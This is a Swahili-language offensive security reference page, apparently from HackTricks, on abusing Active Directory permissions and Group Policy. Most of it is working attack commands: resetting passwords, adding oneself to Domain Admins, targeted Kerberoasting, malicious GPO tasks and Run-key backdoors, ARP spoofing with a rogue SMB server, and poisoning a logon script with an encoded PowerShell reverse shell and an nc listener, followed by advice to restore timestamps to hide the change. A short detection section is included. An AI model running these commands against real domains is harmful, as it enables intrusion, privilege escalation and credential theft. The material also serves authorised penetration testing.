# Kutumia Vibaya Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu kwa kiasi kikubwa ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asili.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Haki za GenericAll kwenye User**

Privilege hii humpa attacker udhibiti kamili wa account ya user lengwa. Baada ya haki za `GenericAll` kuthibitishwa kwa kutumia command ya `Get-ObjectAcl`, attacker anaweza:

- **Kubadilisha Password ya Lengwa**: Kwa kutumia `net user <username> <password> /domain`, attacker anaweza kuweka upya password ya user.
- Kutoka Linux, unaweza kufanya jambo hilo hilo kupitia SAMR ukitumia Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Ikiwa akaunti imezimwa, ondoa UAC flag**: `GenericAll` inaruhusu kuhariri `userAccountControl`. Kutoka Linux, BloodyAD inaweza kuondoa flag ya `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya iwe kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja heshi za ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yake iwe katika hatari ya ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Kwa `GenericAll` kwenye user, unaweza kuongeza credential inayotegemea certificate na ku-authenticate kama user huyo bila kubadilisha password yake. Tazama:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Privilege hii humruhusu attacker kubadilisha group memberships ikiwa ana rights za `GenericAll` kwenye group kama `Domain Admins`. Baada ya kutambua distinguished name ya group kwa kutumia `Get-NetGroup`, attacker anaweza:

- **Add Themselves to the Domain Admins Group**: Hili linaweza kufanywa kupitia direct commands au kwa kutumia modules kama Active Directory au PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Kutoka Linux unaweza pia kutumia BloodyAD kujiongeza kwenye groups za kiholela unapokuwa na GenericAll/Write membership juu yao. Ikiwa group lengwa limewekwa ndani ya “Remote Management Users”, utapata mara moja WinRM access kwenye hosts zinazoheshimu group hiyo:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na privileges hizi kwenye computer object au user account huruhusu:

- **Kerberos Resource-based Constrained Delegation**: Huwezesha kuchukua udhibiti wa computer object.
- **Shadow Credentials**: Hutumia technique hii kuiga computer au user account kwa kutumia vibaya privileges za kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa user ana haki za `WriteProperty` kwenye objects zote za Group maalum (kwa mfano, `Domain Admins`), anaweza:

- **Add Themselves to the Domain Admins Group**: Hufanikishwa kwa kuchanganya commands za `net user` na `Add-NetGroupUser`; njia hii huruhusu privilege escalation ndani ya domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ruhusa hii huwawezesha attackers kujiongeza kwenye groups maalum, kama vile `Domain Admins`, kupitia commands zinazobadilisha moja kwa moja uanachama wa group. Kutumia mfuatano wa commands ufuatao huwezesha kujiongeza mwenyewe:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ruhusa inayofanana na hii huwawezesha attackers kujiongeza moja kwa moja kwenye groups kwa kurekebisha group properties ikiwa wana haki ya `WriteProperty` kwenye groups hizo. Uthibitishaji na utekelezaji wa ruhusa hii hufanywa kwa:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kuwa na `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu kuweka upya password bila kujua password ya sasa. Uthibitishaji wa right hii na exploitation yake unaweza kufanywa kupitia PowerShell au command-line tools mbadala, zikitumia mbinu kadhaa za kuweka upya password ya mtumiaji, ikiwemo interactive sessions na one-liners kwa mazingira yasiyo ya interactive. Commands zinaanzia PowerShell invocations rahisi hadi kutumia `rpcclient` kwenye Linux, zikionyesha versatility ya attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner kwenye Group**

Ikiwa attacker atagundua kuwa ana haki za `WriteOwner` juu ya group, anaweza kubadilisha umiliki wa group hiyo uwe wake. Hili lina athari kubwa hasa group inayohusika ikiwa ni `Domain Admins`, kwa kuwa kubadilisha umiliki huruhusu udhibiti mpana zaidi wa attributes na membership za group. Mchakato unahusisha kutambua object sahihi kwa kutumia `Get-ObjectAcl`, kisha kutumia `Set-DomainObjectOwner` kubadilisha owner, ama kwa SID au kwa jina.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ruhusa hii humruhusu mshambuliaji kurekebisha sifa za user. Hasa, akiwa na access ya `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya logon script ya user ili kutekeleza script hasidi user anapoingia kwenye mfumo. Hili hufanywa kwa kutumia command ya `Set-ADObject` kusasisha property ya `scriptpath` ya user lengwa ili kuelekeza kwenye script ya mshambuliaji.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Kwa privilege hii, attackers wanaweza kubadilisha membership ya group, kama vile kujiongeza wenyewe au kuongeza users wengine kwenye groups maalum. Mchakato huu unahusisha kuunda credential object, kuitumia kuongeza au kuondoa users kwenye group, na kuthibitisha mabadiliko ya membership kwa kutumia PowerShell commands.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Kutoka Linux, Samba `net` inaweza kuongeza/kuondoa wanachama wakati una `GenericWrite` kwenye group (inafaa wakati PowerShell/RSAT hazipatikani):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Kumiliki kitu cha AD na kuwa na privileges za `WriteDACL` juu yake humwezesha mshambuliaji kujipa privileges za `GenericAll` juu ya kitu hicho. Hili hutekelezwa kupitia ADSI manipulation, ikiruhusu udhibiti kamili wa kitu hicho na uwezo wa kurekebisha group memberships zake. Licha ya hili, kuna vikwazo wakati wa kujaribu kutumia privileges hizi kupitia cmdlets za `Set-Acl` / `Get-Acl` za Active Directory module.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner takeover ya haraka (PowerView)

Unapokuwa na `WriteOwner` na `WriteDacl` juu ya user au service account, unaweza kupata udhibiti kamili na kuweka upya password yake kwa kutumia PowerView bila kujua password ya zamani:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Maelezo:
- Huenda ukahitaji kwanza kubadilisha owner awe wewe mwenyewe ikiwa una `WriteOwner` pekee:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Thibitisha access kwa kutumia protocol yoyote (SMB/LDAP/RDP/WinRM) baada ya kuweka upya password.

## **Replication on the Domain (DCSync)**

DCSync attack hutumia replication permissions maalum kwenye domain ili kuiga Domain Controller na kusawazisha data, ikiwemo credentials za watumiaji. Technique hii yenye nguvu inahitaji permissions kama `DS-Replication-Get-Changes`, zinazowawezesha attackers kutoa taarifa nyeti kutoka AD environment bila access ya moja kwa moja kwa Domain Controller.<sup>[[5]](#references)</sup> [**Jifunze zaidi kuhusu DCSync attack hapa.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Access iliyokabidhiwa ya kusimamia Group Policy Objects (GPOs) inaweza kuleta security risks kubwa. Kwa mfano, ikiwa user kama `offense\spotless` amepewa delegated GPO management rights, anaweza kuwa na privileges kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Permissions hizi zinaweza kutumiwa vibaya kwa madhumuni mabaya, kama ilivyotambuliwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerate GPO Permissions

Ili kutambua GPOs zilizosanidiwa vibaya, cmdlets za PowerSploit zinaweza kuunganishwa. Hii inaruhusu kugundua GPOs ambazo user maalum ana permissions za kuzisimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Inawezekana kutambua ni computers zipi GPO maalum inatumika, jambo linalosaidia kuelewa scope ya potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Ili kuona policies zinazotumika kwenye computer maalum, commands kama `Get-DomainGPO` zinaweza kutumika.

**OUs with a Given Policy Applied**: Kutambua organizational units (OUs) zinazoathiriwa na policy maalum kunaweza kufanywa kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia tool [**GPOHound**](https://github.com/cogiceo/GPOHound) ku-enumerate GPOs na kupata issues ndani yake.

### Abuse GPO - New-GPOImmediateTask

GPOs zilizosanidiwa vibaya zinaweza kutumiwa vibaya ku-execute code, kwa mfano, kwa kuunda immediate scheduled task. Hii inaweza kufanywa ili kuongeza user kwenye local administrators group kwenye machines zilizoathiriwa, na hivyo kuinua privileges kwa kiwango kikubwa:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, ikiwa imewekwa, inaruhusu kuunda na kuunganisha GPO mpya, pamoja na kuweka preferences kama vile registry values ili kutekeleza backdoors kwenye computers zilizoathirika. Njia hii inahitaji GPO isasishwe na user aingie kwenye computer ili utekelezaji ufanyike:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse hutoa njia ya kutumia vibaya GPO zilizopo kwa kuongeza tasks au kurekebisha settings bila hitaji la kuunda GPO mpya. Tool hii inahitaji kurekebisha GPO zilizopo au kutumia tools za RSAT kuunda mpya kabla ya kutekeleza mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Kulazimisha Usasishaji wa Policy

Masasisho ya GPO kwa kawaida hutokea takriban kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha usasishaji wa policy mara moja. Amri hii huhakikisha kwamba marekebisho yoyote kwenye GPO yanatekelezwa bila kusubiri mzunguko unaofuata wa usasishaji wa kiotomatiki.

### Chini ya Pazia

Baada ya kukagua Scheduled Tasks za GPO fulani, kama vile `Misconfigured Policy`, uwepo wa tasks kama `evilTask` unaweza kuthibitishwa. Tasks hizi huundwa kupitia scripts au command-line tools zinazolenga kubadilisha tabia ya mfumo au kuongeza privileges.

Muundo wa task, kama unavyoonyeshwa kwenye faili ya XML configuration iliyotengenezwa na `New-GPOImmediateTask`, unaeleza maelezo ya scheduled task - ikiwemo amri itakayotekelezwa na triggers zake. Faili hii inawakilisha jinsi scheduled tasks zinavyofafanuliwa na kusimamiwa ndani ya GPOs, na kutoa njia ya kutekeleza arbitrary commands au scripts kama sehemu ya utekelezaji wa policy.

### Users na Groups

GPOs pia huruhusu manipulation ya memberships za users na groups kwenye mifumo lengwa. Kwa kuhariri faili za Users na Groups policy moja kwa moja, attackers wanaweza kuongeza users kwenye privileged groups, kama vile local `administrators` group. Hili linawezekana kupitia delegation ya permissions za usimamizi wa GPO, ambayo inaruhusu kubadilisha policy files ili kujumuisha users wapya au kubadilisha memberships za groups.

Faili ya XML configuration ya Users na Groups inaeleza jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza entries kwenye faili hii, users maalum wanaweza kupewa elevated privileges kwenye mifumo iliyoathirika. Njia hii hutoa mbinu ya moja kwa moja ya privilege escalation kupitia GPO manipulation.

Zaidi ya hayo, mbinu nyingine za kutekeleza code au kudumisha persistence, kama vile kutumia logon/logoff scripts, kubadilisha registry keys kwa ajili ya autoruns, kusakinisha software kupitia faili za .msi, au kuhariri service configurations, pia zinaweza kuzingatiwa. Techniques hizi hutoa njia mbalimbali za kudumisha access na kudhibiti mifumo lengwa kupitia abuse ya GPOs.

### Kuelekeza upya urejeshaji wa GPC/GPT kwenda kwenye rogue services zinazohitaji authentication

GPO huwa na LDAP **Group Policy Container (GPC)** yenye metadata na **Group Policy Template (GPT)** inayohostiwa na SMB pamoja na policy files. Wakati wa refresh, client hufuata `gPLink` ya container, husoma GPC iliyorejelewa na `gPCFileSysPath` yake, kisha hupakua GPT kutoka kwenye UNC path hiyo. Kwa hivyo, write access kwenye GPC yenyewe au kwenye `gPLink` ya OU, Site au Domain inaweza kubadilishwa kuwa privileged policy processing.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Poisoning ya `gPCFileSysPath` kwa kutumia GPOddity

Ikiwa principal inayodhibitiwa inaweza kuandika kwenye GPC lengwa (moja kwa moja au kupitia **NTLM relay to LDAP**), badilisha `gPCFileSysPath` iwe UNC path inayohostiwa na attacker. [GPOddity](https://github.com/synacktiv/GPOddity) hu-automate mabadiliko ya LDAP na ku-serve GPT hasidi iliyo na module-based policy files au Immediate Task ambayo Group Policy client huitekeleza kama `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

SMB share isiyohitaji authentication au isiyofungamana na credentials haitoshi kwenye Windows clients za sasa: SMB Secure Negotiate huhitaji uthibitisho kwamba authentication ilifanikiwa, kwa hivyo rogue service lazima ithibitishe domain identity, itengeneze SMB session key na isaini responses zake kwa usahihi. Katika embedded mode, configure GPOddity kwa kutumia controlled machine account na service key yake, kisha chagua computer- au user-side payload kwenye sehemu ya `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Kesi ya kipekee ya User GPO:** baada ya MS16-072, Windows bado huunda sessions mbili za SMB2 katika **muunganisho uleule wa TCP**: session ya user husoma `GPT.INI`, kisha session ya akaunti ya computer husoma usanidi unaotumika, kama vile `ScheduledTasks.xml`. Kwa hivyo, server hasidi lazima iorodheshe hali ya authentication, session keys na signing keys kwa kutumia `SMB2 SessionId`, na si kwa socket pekee. Fork ya Scapy iliyojumuishwa katika GPOddity/OUned hutekeleza hili kupitia `SMBStreamSocketMultiplexing` na `SMBServer` inayotambua multiplexing; servers za Impacket/Scapy za single-session vinginevyo hutumia tena signing state isiyofaa na hushindwa kwenye user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning with OUned

Kwa `WriteGPLink`, `GenericWrite` au udhibiti unaolingana kwenye OU, Site au Domain, mshambuliaji anaweza kuongeza link ambayo GPC DN yake inatolewa na LDAP host inayodhibitiwa na mshambuliaji. Primitive hii iliwasilishwa awali na Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) huautomate LDAP write na malicious GPC/GPT chain.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Mwathiriwa kwanza hujithibitisha kwenye rogue LDAP service na hupokea GPC ambayo `gPCFileSysPath` yake inaelekeza kwenye rogue SMB service; kisha hujithibitisha kwenye SMB na kutumia GPT iliyotolewa. Kwa hiyo, OUned anahitaji account yenye LDAP SPN, machine account yenye HOST SPN kwa SMB (machine account hiyo hiyo inaweza kutimiza mahitaji yote mawili), pamoja na DNS resolution au reverse forwarding inayotuma ports 389 na 445 kwenye operator host.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
OUned's embedded Scapy LDAP server huthibitisha Kerberos/SPNEGO kwa kutumia service key halisi inayodhibitiwa na kutoa data holela ya GPC kutoka kwa JSON. JSON key tupu huwakilisha rootDSE, viambishi awali vya `base64:` huwakilisha thamani za binary, na server inasaidia add/delete/modify/search pamoja na utafutaji wa `BASE`, `LEVEL` na `SUBTREE`; inaweza kufanya negotiation bila protection, kwa integrity au kwa confidentiality. Hii huifanya service itumike tena wakati Windows component nyingine inafuata LDAP reference inayodhibitiwa na attacker lakini inasisitiza LDAP iliyo authenticated.<sup>[[15]](#references)</sup>

Usidhani kwamba kusawazisha password ya account kwenye dummy domain kunazalisha kila Kerberos key: RC4 hutokana na password, ilhali AES string-to-key pia hutumia salt inayotokana na hostname/domain ya principal. Kutoa AES key halisi ya account kwa `KerberosSSP` huepuka kulazimisha RC4 kupitia mabadiliko yanayoweza kutambuliwa kwenye `msDS-SupportedEncryptionTypes` ya machine account ambayo inaweza kujibadilisha yenyewe.<sup>[[15]](#references)</sup>

#### Mikakati ya Detection

Correlate mabadiliko ya `gPCFileSysPath` au `gPLink` na mabadiliko ya GPO version pamoja na XML mpya za Immediate/Scheduled Task. Chunguza links zinazoelekea kwenye naming contexts zisizotarajiwa, UNC hosts zilizo nje ya seti iliyoidhinishwa ya DC/SYSVOL, DNS records zinazoelekeza upya majina ya machine account, service tickets za LDAP/CIFS za machine accounts zisizo za kawaida, na mabadiliko ya `msDS-SupportedEncryptionTypes` yanayowezesha RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` kwenye OU/domain hukuruhusu kurekebisha attribute ya `gPLink` ya target container na **kulazimisha GPO iliyopo itumike** bila kuhariri GPO yenyewe. Hili huwa muhimu wakati GPO iliyounganishwa tayari inarejelea content ya mbali kupitia **UNC paths** (`\\HOST\share\...`), kwa sababu authenticated users wanaweza kusoma **SYSVOL** na kutafuta policies zinazoweza kutumiwa tena offline.<sup>[[11]](#references)</sup>

Workflow ya kiwango cha juu:

1. Tumia BloodHound kutambua principal yenye `WriteGPLink` kwenye OU na kuorodhesha computers/users walio ndani ya OU hiyo.
2. Clone `SYSVOL` kwa read-only na uchanganue GPOs ukitafuta **Software Installation**, **drive mappings** (`Drives.xml`), na **logon/startup scripts** zinazorejelea UNC paths.
3. Pendelea policies zinazoelekeza kwenye **direct hostname** (kwa mfano `\\DC02\share\pkg.msi`) badala ya DFS/domain-namespace paths, kwa sababu hostname-based paths ni rahisi zaidi kuelekezwa upya kwa L2 spoofing.
4. Ongeza GPO GUID iliyochaguliwa kwenye `gPLink` ya target OU ili victim isindika policy hiyo iliyokuwepo tayari.
5. Kwenye broadcast domain hiyo hiyo, fanya ARP spoof ya UNC host na u-bind IP yake locally (`ip addr add <target_ip>/32 dev <iface>`) ili SMB traffic ya victim ifikie host yako.
6. Serve path/filename inayotarajiwa kutoka kwa attacker SMB server (kwa mfano `smbserver.py`) na usubiri policy processing ya kawaida.

Mfano wa ukusanyaji wa `SYSVOL` na correlation ya GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Unganisha GPO iliyopo na OU lengwa:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Ikiwa GPO iliyounganishwa itadeploy MSI kutoka kwenye UNC path, client itaifetch wakati wa **computer startup** na kuiinstall kama **`NT AUTHORITY\SYSTEM`**. Kwa ku-spoof host iliyorejelewa na ku-serve MSI hasidi chini ya **share/path/name** hiyo hiyo, unaweza kubadilisha `WriteGPLink` kuwa SYSTEM code execution **bila kurekebisha SYSVOL**.

Mikwazo muhimu:

- **Timing matters**: link mpya itaonekana wakati wa policy refresh (kwa kawaida ~dakika 90), lakini **Software Installation** kwa kawaida hu-trigger wakati wa **reboot**.
- Windows Installer kwa kawaida hufuatilia deployment kwa kutumia **`ProductCode`** ya package. Ikiwa product tayari imeinstalliwa, deployment inaweza kurukwa.
- Ili kuepuka installer kuikataa, patch MSI rogue ili **`ProductCode`** na **`PackageCode`** zake zilingane na package halali inayotarajiwa na GPO.
- Faili za zamani za advertisement za `.aas` zinaweza kubaki kwenye `SYSVOL`, kwa hiyo thibitisha kuwa deployment bado inaonekana active kabla ya kuitegemea.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings katika `Drives.xml` husababisha users kufanya authentication kwenye UNC path iliyosanidiwa wakati wa logon au reconnection. Ukispoof host iliyorejelewa, unaweza kunasa **NetNTLMv2**. Ikiwa SMB itafanywa ishindwe kwa makusudi, Windows inaweza kujaribu tena kupitia **WebDAV**, ikituma **NTLM over HTTP**, ambayo ni rahisi zaidi kutumika kwa relays kwenda **LDAP(S)**, **AD CS**, au **SMB**.

#### Logon/startup script UNC hijack

Mfumo huohuo unatumika kwa scripts zinazopangishwa kwenye UNC na kupatikana katika `SYSVOL`:

- **Logon scripts** kwa kawaida huendeshwa katika muktadha wa **user**.
- **Startup scripts** kwa kawaida huendeshwa katika muktadha wa **computer / SYSTEM**.

Ikiwa script path inaelekeza kwenye hostname inayoweza ku-spoofiwa, redirect UNC host na utoe replacement script content kutoka location inayotarajiwa.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths zilizo chini ya `\\<dc>\SYSVOL\<domain>\scripts\` au `\\<dc>\NETLOGON\` zinaruhusu kufanyiwa tampering kwa logon scripts zinazoendeshwa wakati wa user logon kupitia GPO. Hii husababisha code execution katika security context ya users wanaoingia.

### Tafuta logon scripts
- Kagua user attributes ili kupata logon script iliyosanidiwa:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Changanua domain shares ili kubaini shortcuts au marejeo ya scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Changanua faili za `.lnk` ili kutambua targets zinazoelekeza kwenye SYSVOL/NETLOGON (mbinu muhimu ya DFIR na kwa attackers wasio na ufikiaji wa moja kwa moja wa GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound huonyesha attribute ya `logonScript` (`scriptPath`) kwenye user nodes inapopatikana.

### Thibitisha write access (usiutumainie uorodheshaji wa shares)
Zana za kiotomatiki zinaweza kuonyesha SYSVOL/NETLOGON kama read-only, lakini NTFS ACLs za msingi bado zinaweza kuruhusu writes. Jaribu kila mara:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Ikiwa ukubwa wa file au mtime utabadilika, una write. Hifadhi originals kabla ya kufanya marekebisho.

### Poison a VBScript logon script for RCE
Ongeza command inayozindua PowerShell reverse shell (itengeneze kutoka revshells.com) na uhifadhi original logic ili kuepuka kuharibu business function:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Sikiliza kwenye host yako na usubiri interactive logon inayofuata:
```bash
rlwrap -cAr nc -lnvp 443
```
- Utekelezaji hufanyika chini ya token ya mtumiaji anayerekodi kumbukumbu (si SYSTEM). Scope ni kiungo cha GPO (OU, site, domain) kinachotumia script hiyo.
- Fanya usafishaji kwa kurejesha content/timestamps za awali baada ya matumizi.


## References

- [1] [Kutumia vibaya Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Akaunti za Privileged na Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Sasisho la Njia ya Mashambulizi ya ACL](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Kuongeza privileges kwa kutumia ACLs katika Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Kuchanganua Privileges za Active Directory na Akaunti za Privileged](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
